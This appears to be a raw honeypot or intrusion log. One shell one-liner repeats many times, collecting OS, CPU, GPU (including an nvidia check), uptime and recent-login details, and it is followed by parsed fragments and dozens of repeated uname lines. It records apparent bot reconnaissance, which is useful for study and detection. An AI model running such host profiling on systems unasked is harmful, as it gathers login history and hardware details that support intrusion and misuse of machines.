uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname -s -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
uname -s -v -n -r -m
